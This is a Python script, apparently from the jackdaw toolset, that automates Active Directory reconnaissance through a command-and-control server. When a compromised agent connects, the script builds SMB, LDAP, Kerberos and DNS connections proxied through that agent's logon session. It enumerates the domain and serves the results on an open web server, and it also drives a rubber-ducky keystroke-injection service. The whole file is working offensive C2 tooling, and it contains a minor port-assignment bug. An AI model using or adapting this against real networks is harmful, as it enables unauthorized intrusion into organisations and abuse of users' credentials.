
import asyncio
import os
import traceback
from urllib.parse import urlparse, parse_qs
import multiprocessing
import pathlib
import datetime
import json

from jackdaw.dbmodel import create_db, get_session
from jackdaw.gatherer.gatherer import Gatherer
from jackdaw.nest.wrapper import NestServer
from jackdaw.aclpwn import ACLPwn

import websockets
from pyodidewsnet.protocol import OPCMD, CMD, WSNOK, CMDType, WSNSocketData, WSNConnect
import multiprocessing

# this is a pyodide module to access javascript objects
#from js import wsnet
#import js

class WebServerProcess(multiprocessing.Process):
	def __init__(self, db_conn, bind_ip, bind_port, work_dir, graph_backend = 'networkx'):
		multiprocessing.Process.__init__(self)
		self.db_conn = db_conn
		self.bind_ip = bind_ip
		self.bind_port = bind_port
		self.work_dir = work_dir
		self.graph_backend = graph_backend
		self.server = None

	def run(self):
		self.server = NestServer(
				self.db_conn, 
				bind_ip = self.bind_ip, 
				bind_port = self.bind_port,
				debug = False,
				work_dir = self.work_dir,
				graph_backend = self.graph_backend,
			)
		print('runnin server!')
		self.server.run()

DUCKY_EVENT_LOOKUP = {
	'CONNECTED'      : 'STRING Connected to the C2 server!\r\nENTER',
	'AGENTCONNECTED' : 'STRING Agent connected!\r\nENTER',
	'JDENUMSTART'    : 'STRING Starting domain enumeration\r\nENTER',
	'JDENUMFINISH'   : 'STRING Domain enumeration finished!\r\nENTER',
	'JDSERVICESTART' : 'STRING JD service\r\nENTER',
}

class C2AutoStart:
	def __init__(self, c2url, workdir = None, duckysvc = None, duckyevent = DUCKY_EVENT_LOOKUP):
		self.c2url = c2url
		self.workdir = workdir
		self.duckysvc_url = duckysvc
		self.duckysvc_event = duckyevent
		self.ws = None
		self.c2_ip = None
		self.c2_port = None
		self.c2_proto = None

		self.web_start_port = 5000
		self.duck_task = None
		self.ducky_q = None

	def get_web_port(self):
		t = self.web_start_port
		self.web_start_port += 1
		return t

	async def setup(self):
		if self.duckysvc_event is None:
			self.duckysvc_event = DUCKY_EVENT_LOOKUP
		elif isinstance(self.duckysvc_event, str):
			with open(self.duckysvc_event, 'r') as f:
				self.duckysvc_event = json.load(f)
		self.ducky_q = asyncio.Queue()
		self.duck_task = asyncio.create_task(self.__ducky_send())

		if self.workdir is None:
			self.workdir = str(pathlib.Path.cwd())
		o = urlparse(self.c2url)
		self.c2_proto = o.scheme
		self.c2_ip = o.hostname
		self.c2_port = o.port
		if self.c2_port is None:
			if self.c2_proto == 'ws':
				self.c2_port = 80
			else:
				self.c2_port == 443

	async def __ducky_send(self):
		if self.duckysvc_url is None:
			while True:
				try:
					await self.ducky_q.get()
				except:
					return

		else:
			while True:
				async with websockets.connect(self.duckysvc_url) as websocket:
					while True:
						try:
							data = await self.ducky_q.get()
							await websocket.send(data)
						except:
							break
				await asyncio.sleep(5)
		

	async def __start_cmd(self, cmd):
		try:
			print('New agent connected to C2! Starting jackdaw...')
			print(cmd.to_dict())

			await self.ducky_q.put(self.duckysvc_event['AGENTCONNECTED'])

			wsproto = 'wsnetws' if self.c2_proto == 'ws' else 'wsnetwss'
			domain = cmd.domain
			username = cmd.username
			if username.find('\\') != -1:
				domain, username = username.split('\\')
			
			dns_url = 'dns://%s:53/?proxytype=%s&proxyhost=%s&proxyport=%s&proxyagentid=%s' % (cmd.logonserver, wsproto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			kerberos_url = '%s://%s:%s/?type=sspiproxy&agentid=%s' % (self.c2_proto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			params = 'authhost=%s&authport=%s&authagentid=%s&proxytype=%s&proxyhost=%s&proxyport=%s&proxyagentid=%s' % ( self.c2_ip, self.c2_port, cmd.agentid.hex(), wsproto, self.c2_ip, self.c2_port, cmd.agentid.hex())
			smb_url = 'smb2+sspiproxy-ntlm://%s\\%s:aa@%s/?%s' % (domain, username, cmd.logonserver, params)
			ldap_url = 'ldap+sspiproxy-ntlm://%s\\%s:aa@%s/?%s' % (domain, username, cmd.logonserver, params)

			print('dns %s' % dns_url)
			print('kerberos %s' % kerberos_url)
			print('smb %s' % smb_url)
			print('ldap %s' % ldap_url)

			smb_workers = 10
			ldap_workers = 4
			
			loc_base = '%s_%s' % (datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S"), cmd.agentid.hex())
			p = pathlib.Path(self.workdir).joinpath('./workdir_' + loc_base)
			db_loc = '%s_%s.db' % (cmd.domain, loc_base)
			db_loc = p.joinpath(db_loc)
			db_conn = 'sqlite:///%s' % db_loc
			create_db(db_conn)

			
			p.mkdir(parents=True, exist_ok=True)
			work_dir = str(p)

			print(work_dir)
			print(db_conn)
			
			await self.ducky_q.put(self.duckysvc_event['JDENUMSTART'])

			with multiprocessing.Pool() as mp_pool:
				gatherer = Gatherer(
					db_conn, 
					work_dir, 
					ldap_url, 
					smb_url,
					kerb_url=kerberos_url,
					ldap_worker_cnt=ldap_workers, 
					smb_worker_cnt=smb_workers, 
					mp_pool=mp_pool, 
					smb_gather_types=['all'],
					progress_queue=None, 
					show_progress=True,
					calc_edges=True,
					ad_id=None,
					dns=dns_url,
					no_work_dir=False
				)
				_, err = await gatherer.run()
				if err is not None:
					raise err
			
			print('Jackdaw finished sucsessfully!')

			await self.ducky_q.put(self.duckysvc_event['JDENUMFINISH'])

			web_port = self.get_web_port()
			print('Starting webserver on port %s' % (web_port))
			websrv = WebServerProcess(db_conn, '0.0.0.0', web_port, work_dir)
			websrv.start()

			#checking if server is up now...
			while True:
				try:
					reader, writer = await asyncio.open_connection('127.0.0.1', web_port)
				except:
					print('Could not connect to webserver, probably not ready yet')
					await asyncio.sleep(1)
				else:
					print('Jackdaw server started!')
					writer.close()
					break
			
			await self.ducky_q.put(self.duckysvc_event['JDSERVICESTART'])
			await asyncio.sleep(1000)

		except Exception as e:
			print(e)

	async def run(self):
		try:
			first= True
			await self.setup()
			while True:
				if first is False:
					await asyncio.sleep(5)
				first = False
				print('Connecting to C2 server')
				try:
					self.ws = await websockets.connect(self.c2url)
				except Exception as e:
					print('Failed to connect to server!')
					continue
				
				print('Connected to the C2 server!')

				await self.ducky_q.put(self.duckysvc_event['CONNECTED'])
				while True:
					try:
						data = await self.ws.recv()
						cmd = CMD.from_bytes(data)
						if cmd.type == CMDType.AGENTINFO:
							asyncio.create_task(self.__start_cmd(cmd))
						
					except Exception as e:
						print('run exception!')
						print(e)
						continue
				
		except Exception as e:
			print(e)


async def amain(url, workdir, duckysvc = None, duckyevent = None):
	auto = C2AutoStart(url, workdir, duckysvc = duckysvc, duckyevent=duckyevent)
	await auto.run()


def main():
	import argparse
	import platform
	import logging
	
	parser = argparse.ArgumentParser(description='Jackdaw autostarter for wsnetws C2 server')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('-w', '--workdir', help = 'Work data directory to store all results')
	parser.add_argument('-d', '--duckysvc', help = 'DuckySvc URL for keyboard autotype')
	parser.add_argument('-e', '--duckyevent', help = 'Event file for the keyboard autotype')
	parser.add_argument('url', help = 'url')
	
	args = parser.parse_args()

	asyncio.run(amain(args.url, args.workdir, args.duckysvc, args.duckyevent))

if __name__ == '__main__':
	main()